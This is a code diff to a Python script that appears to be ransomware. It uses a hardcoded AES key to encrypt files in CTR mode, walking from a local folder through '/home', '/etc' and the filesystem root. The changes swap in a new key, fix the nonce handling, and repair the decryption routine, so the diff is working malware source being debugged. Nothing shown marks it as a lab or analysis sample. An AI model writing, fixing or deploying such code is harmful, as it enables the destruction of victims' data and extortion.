@@ -10,7 +10,7 @@ import Discovery
 # 128/192/256 bits -1
 # --------------
 
-HARDCODED_KEY = b'7yLc5b5P5z5RJ94DKF5ZG36jwf5QePr5'
+HARDCODED_KEY = b'a81c5c5b93e4df73d6e4e3a2c4a64fb7'
 
 
 def arg_parser():
@@ -35,11 +35,12 @@ def main():
             key = HARDCODED_KEY
 
     nonce = os.urandom(16)
-    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce[:16]))
-    crypt = cipher.encryptor()
+    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))
+    cryptor = cipher.encryptor()
+    decryptor = cipher.decryptor()
 
     if not decrypt:
-        cryptFn = crypt.update
+        cryptFn = cryptor.update
 
         init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
         startDirs = [init_path, '/home', '/etc', '/']
@@ -57,7 +58,7 @@ def main():
         pass
 
     else:
-        cryptFn = crypt.decrypt
+        cryptFn = decryptor.update
 
         init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
         startDirs = [init_path, '/home', '/etc', '/']
